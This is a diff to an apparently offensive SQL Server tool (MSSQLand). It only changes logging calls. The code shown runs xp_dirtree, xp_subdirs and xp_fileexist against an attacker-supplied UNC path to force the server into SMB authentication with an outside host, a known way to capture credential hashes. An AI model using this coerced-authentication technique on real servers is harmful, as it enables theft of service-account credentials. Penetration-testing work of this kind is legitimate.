@@ -34,7 +34,6 @@ namespace MSSQLand.Actions.Network
             {
                 // Only hostname, add default share
                 path = path.TrimEnd('\\') + "\\Data";
-                Logger.Info($"No share name provided, using default: {path}");
             }
 
             // Verify UNC path
@@ -84,7 +83,7 @@ namespace MSSQLand.Actions.Network
         {
             try
             {
-                Logger.Info("Trying xp_dirtree method...");
+                Logger.TaskNested("Trying xp_dirtree method...");
 
                 string query = $"EXEC master..xp_dirtree '{_uncPath}';";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
@@ -106,7 +105,7 @@ namespace MSSQLand.Actions.Network
         {
             try
             {
-                Logger.Info("Trying xp_subdirs method...");
+                Logger.TaskNested("Trying xp_subdirs method...");
 
                 string query = $"EXEC master..xp_subdirs '{_uncPath}';";
                 databaseContext.QueryService.ExecuteNonProcessing(query);
@@ -128,7 +127,7 @@ namespace MSSQLand.Actions.Network
         {
             try
             {
-                Logger.Info("Trying xp_fileexist method...");
+                Logger.TaskNested("Trying xp_fileexist method...");
 
                 // xp_fileexist requires a file path, append a file
                 string filePath = _uncPath.TrimEnd('\\') + "\\data.txt";
@@ -136,7 +135,7 @@ namespace MSSQLand.Actions.Network
                 databaseContext.QueryService.ExecuteNonProcessing(query);
 
                 Logger.Success("SMB request sent successfully using xp_fileexist");
-                Logger.Info("Note: xp_fileexist was used with a dummy file path to trigger SMB authentication");
+                Logger.TaskNested("Note: xp_fileexist was used with a dummy file path to trigger SMB authentication");
                 return true;
             }
             catch (Exception ex)
